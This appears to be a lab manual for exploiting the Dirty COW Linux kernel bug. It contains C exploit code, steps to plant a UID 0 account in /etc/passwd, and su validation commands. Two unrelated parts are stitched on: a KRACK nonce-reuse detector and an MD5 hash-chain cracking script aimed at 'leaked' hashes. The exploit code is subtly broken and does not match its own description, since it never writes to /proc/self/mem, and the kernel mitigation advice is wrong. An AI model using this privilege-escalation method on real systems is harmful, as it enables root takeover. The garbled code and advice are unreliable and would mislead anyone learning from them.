Lab Manual: Exploiting CVE-2016-5195 (Dirty COW) on Ubuntu 16.04

1. Setup QEMU/KVM with virt-manager
- Install QEMU/KVM on Ubuntu 16.04 using the following command:
  $ sudo apt-get install qemu-kvm libvirt-bin virt-manager

2. Create a virtual machine with Ubuntu 16.04 and kernel 4.4.0-21
- Open virt-manager and create a new virtual machine.
- Select "Local install media" and browse to the Ubuntu 16.04 ISO file.
- Follow the installation wizard to complete the setup.

3. Exploiting CVE-2016-5195 with dual-threaded exploit
- Create a C program with dual threads for exploiting the Dirty COW vulnerability. Below is a commented C code for the exploit:

```c
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <time.h>

#define TARGET_FILE "/etc/passwd"
#define SHELLCODE "YOUR_SHELLCODE_HERE"

void *madviseThread(void *arg) {
    char *str;
    int i, c = 0;

    for (i = 0; i < 1000000; i++) {
        str = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (str == MAP_FAILED) {
            perror("mmap");
            exit(1);
        }

        madvise(str, 100, MADV_DONTNEED);
        c++;
    }
}

void *procselfmemThread(void *arg) {
    char *str;
    int f;

    f = open(TARGET_FILE, O_RDWR);
    if (f == -1) {
        perror("open");
        exit(1);
    }

    for (;;) {
        str = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, f, 0);
        if (str == MAP_FAILED) {
            perror("mmap");
            exit(1);
        }

        strcpy(str, SHELLCODE);
        munmap(str, 4096);
    }
}

int main() {
    pthread_t pth1, pth2;
    struct timespec start, end;
    double elapsed;

    clock_gettime(CLOCK_MONOTONIC, &start);

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, NULL);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    clock_gettime(CLOCK_MONOTONIC, &end);
    elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    printf("Exploit took %f seconds\n", elapsed);

    return 0;
}
```

In the above code, the `madviseThread` function continuously calls `mmap` and `madvise` to create a race condition. The `procselfmemThread` function writes the shellcode to `/proc/self/mem` targeting the `/etc/passwd` file.

4. Crafting a SUID root entry in /etc/passwd
- Craft a SUID root entry in `/etc/passwd` using the following offsets:
  - Username: dirtycow
  - Password: x
  - UID: 0
  - GID: 0
  - GECOS: root
  - Home directory: /root
  - Shell: /bin/bash

5. Validation steps
- After running the exploit, validate the SUID root entry using the following commands:
  $ su dirtycow
  $ id

6. Mitigation analysis
- Patch the kernel to version 4.4.0-22 to mitigate the Dirty COW vulnerability.
- Set the sysctl `vm.mmap_min_addr=65536` to prevent mmap from mapping low memory addresses.

Note: The shellcode and exact offsets for crafting the SUID root entry in `/etc/passwd` will vary depending on the system architecture and configuration. Use caution when performing these steps and ensure that you have appropriate permissions to modify system files.

Here's a simple Python code to create a WPA2 handshake diagnostic tool that identifies KRACK susceptibility by monitoring nonce reuse during 4-way handshakes:

```python
import pyshark

def detect_nonce_reuse(file_path):
    cap = pyshark.FileCapture(file_path, display_filter='eapol')
    nonces = {}

    for pkt in cap:
        if 'eapol.keydes.key_info' in pkt and int(pkt['eapol.keydes.key_info'].split(' ')[1], 16) == 1:
            src_mac = pkt.eth.src
            key_nonce = pkt['eapol.keydes.nonce'].replace(':', '')
            if src_mac in nonces:
                if nonces[src_mac] == key_nonce:
                    print(f"Nonce reuse detected for {src_mac}!")
            nonces[src_mac] = key_nonce

    cap.close()

def detect_retransmitted_message(file_path):
    cap = pyshark.FileCapture(file_path, display_filter='eapol')
    message_3_count = {}

    for pkt in cap:
        if 'eapol.keydes.key_info' in pkt and int(pkt['eapol.keydes.key_info'].split(' ')[1], 16) == 3:
            src_mac = pkt.eth.src
            if src_mac in message_3_count:
                message_3_count[src_mac] += 1
                if message_3_count[src_mac] > 1:
                    print(f"Retransmitted Message 3 detected for {src_mac}!")
            else:
                message_3_count[src_mac] = 1

    cap.close()

def analyze_key_reinstallation(file_path):
    cap = pyshark.FileCapture(file_path, display_filter='eapol')
    key_reinstallations = {}

    for pkt in cap:
        if 'eapol.keydes.key_info' in pkt and int(pkt['eapol.keydes.key_info'].split(' ')[1], 16) == 1:
            src_mac = pkt.eth.src
            if src_mac in key_reinstallations:
                key_reinstallations[src_mac] += 1
                print(f"Key reinstallation detected for {src_mac}!")
            else:
                key_reinstallations[src_mac] = 1

    cap.close()

if __name__ == '__main__':
    file_path = 'path_to_pcap_file.pcapng'

    detect_nonce_reuse(file_path)
    detect_retransmitted_message(file_path)
    analyze_key_reinstallation(file_path)
```

This code uses the `pyshark` library to parse pcap files and filter for EAPOL (Extensible Authentication Protocol over LAN) packets. It has three functions: `detect_nonce_reuse`, `detect_retransmitted_message`, and `analyze_key_reinstallation` to identify nonce reuse, retransmitted Message 3, and key reinstallation patterns, respectively.

You can run this code by replacing `file_path` with the path to your pcap file and executing the script. It will print out any KRACK susceptibility issues it detects in the pcap file.

import re
import hashlib
import hmac
import multiprocessing

def detect_salt_pattern(hash_list):
    salt_patterns = []
    for hash in hash_list:
        if re.search(r'_salt[a-z]$', hash):
            salt_patterns.append('_salt[a-z]$')
        elif re.search(r'^[a-z]_salt', hash):
            salt_patterns.append('^[a-z]_salt')
    return salt_patterns

def reduce_hash(hash_hex, length=8):
    byte_val = bytes.fromhex(hash_hex)
    total = sum(byte_val)
    reduced = []
    for _ in range(length):
        total = (total * 2166136261) % 62
        reduced.append('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[total])
    return ''.join(reduced)

def generate_chunk(start):
    current = str(start)
    for _ in range(1000):
        current = reduce_hash(hashlib.md5(current.encode()).hexdigest())
    return current

def verify_chain(target_hash, chain):
    return hmac.compare_digest(target_hash, chain)

if __name__ == '__main__':
    # Example usage
    leaked_hashes = ['d41d8cd98f00b204e9800998ecf8427e', '5f4dcc3b5aa765d61d8327deb882cf99']
    salt_patterns = detect_salt_pattern(leaked_hashes)
    print('Detected salt patterns:', salt_patterns)

    target_hash = '098f6bcd4621d373cade4e832627b4f6'
    with multiprocessing.Pool(8) as p:
        results = p.map(generate_chunk, range(0, 1000000, 125000))

    for result in results:
        if verify_chain(target_hash, result):
            print('Match found:', result)
            break
    else:
        print('No match found')

